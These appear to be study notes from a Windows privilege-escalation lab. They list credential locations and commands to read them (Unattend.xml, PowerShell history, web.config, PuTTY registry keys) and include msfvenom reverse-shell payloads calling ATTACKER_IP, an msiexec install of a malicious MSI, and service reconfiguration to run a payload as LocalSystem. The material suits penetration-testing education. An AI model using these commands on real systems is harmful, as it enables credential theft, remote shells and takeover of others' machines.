- weaknesses for privilege escalation: 
	- Misconfigurations on Windows services or scheduled tasks
	- Excessive privileges assigned to our account
	- Vulnerable software
	- Missing Windows security patches

###### Windows Users
| Administrators     | These users have the most privileges. They can change any system configuration parameter and access any file in the system.                                                             |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Standard Users** | **These users can access the computer but only perform limited tasks. Typically these users can not make permanent or essential changes to the system and are limited to their files.** |
- Users with administrative privileges will be part of the **Administrators** group. Standard users will be part of the **Users** group.

| System/LocalSystem  | An account used by the operating system to perform internal tasks. It has full access to all files and resources available on the host with even higher privileges than administrators. |
| ------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Local Service**   | **Default account used to run Windows services with "minimum" privileges. It will use anonymous connections over the network.**                                                         |
| **Network Service** | **Default account used to run Windows services with "minimum" privileges. It will use the computer credentials to authenticate through the network.**                                   |
###### Harvesting Passwords from Usual Spots
- credentials can be found in plaintext files, or stored by some software like browsers or email clients.
- **Unattended Windows Installations**: same Windows image installed on multiple hosts on the same network through **Windows Deployment Services**. The credentials of the administrator account which performs this setup can be found in:
	-  `C:\Unattend.xml`
	- `C:\Windows\Panther\Unattend.xml`
	- `C:\Windows\Panther\Unattend\Unattend.xml`
	- `C:\Windows\system32\sysprep.inf`
	- `C:\Windows\system32\sysprep\sysprep.xml`

```xml
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
```

###### Powershell history
- **Powershell** command:`type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
- **cmd.exe** command: `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

###### Saved Windows Credentials
- `cmdkey /list`
- `runas /savecred /user:admin cmd.exe`
- with `runas` you can spawn a shell for the specified user. (if there are stored credentials for that user - `cmdkey /list`) 

###### IIS (Internet Information Services) Configuration
- IIS is the default web server on Windows installations. The configuration of websites on IIS is stored in a file called `web.config`. It can store passwords for databases or configured authentication mechanisms.
- Depending on the installed version of IIS:
	- `C:\inetpub\wwwroot\web.config`
	- `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`

- Find database connection strings on the file:
	- `type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString`

###### Retrieve Credentials from Software: PuTTY
- **PuTTY** is an SSH client commonly found on Windows systems. 
- "While PuTTY won't allow users to store their SSH password, it will store proxy configurations that include cleartext authentication credentials. To retrieve the stored proxy credentials, you can search under the following registry key for ProxyPassword with the following command:"
- `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
- Simon Tatham is the creator of PuTTY.

###### Other Quick Wins
- **Scheduled tasks**
	- `schtasks`
	- `schtasks /query /tn <task-name> /fo list /v` - detailed info about a specific task
	- `icacls` - check file permissions on an executable (you can also manage the permissions of a file/folder with this command, just like `chmod` )
	- `C:\> schtasks /run /tn vulntask` - run a specific task manually (in this case `vulntask`)
	
- **AlwaysInstallElevated**:
	- MSI installers can be configured to run with higher privileges.
	- this method requires two registry values to be set
		- `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
		- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
	- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi` - generates a malicious `.msi` file. Don't forget to use the [[Metasploit]] handler module for this reverse shell.
	- after you transferred the file you have created, run the installer with: `msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi`
	- `msf6 exploit(windows/local/always_install_elevated)` 
	
- **Windows Services**
	- The **Service Control Manager** (**SCM**) manages the windows services.
	- `sc qc apphostsvc`
	- Services have a Discretionary Access Control List (`DACL`), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. `Process Hacker` can help you see the `DACL`.
	- All of the services configurations are stored on the registry under `HKLM\SYSTEM\CurrentControlSet\Services\` (Registry Editor)
	- you can see the associated executable on the **ImagePath** value and the account used to start the service on the **ObjectName** value.
	
	![[Registry_Editor_apphostsvc.png]]

- **Insecure Permissions on Service Executable**
	- "If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially."
	- `sc qc WindowsScheduler`
		- `sc` - service control command-line utility
		- `qc`- Query Configuration
		- `WindowsScheduler` - service name, you can specify any service.
		
		![[sc_qc_WindowScheduler_output.png]]
		-  `icacls C:\PROGRA~2\SYSTEM~1\WService.exe`:
		![[windows_privesc_wservice_permissions.png]]
	- `user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe`
	- after transferring the payload, don't forget: `icacls <path to payload> /grant Everyone:F` - it will grant the `F` (Full Control) permission to everyone.
	- use `sc.exe stop <service-name>` and `sc.exe start <service-name>` on **Powershell** (`sc` in **Powershell** is an alias for `Set-Content`)

- **Unquoted Service Paths**
	- A service path that uses proper quotation:![[windows_privesc_service_path1.png]]
	- A service path that doesn't use proper quotation: ![[windows_privesc_service_path2.png]]
		- "Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string."
		- The **Service Control Manager** will try to execute:
		![[windows_privesc_unquoted_path.png]]

- **Insecure Service Permissions**
	-  To check for a service DACL from the command line, you can use [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) from the Sysinternals suite.
	- The command to check for the thmservice service [[DACL (Discretionary Access Control Lists)]] is: `accesschk64.exe -qlc thmservice`
	- if `BUILTIN\\Users` group has the `SERVICE_ALL_ACCESS` permission, any user can reconfigure the service specified
	- `sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem`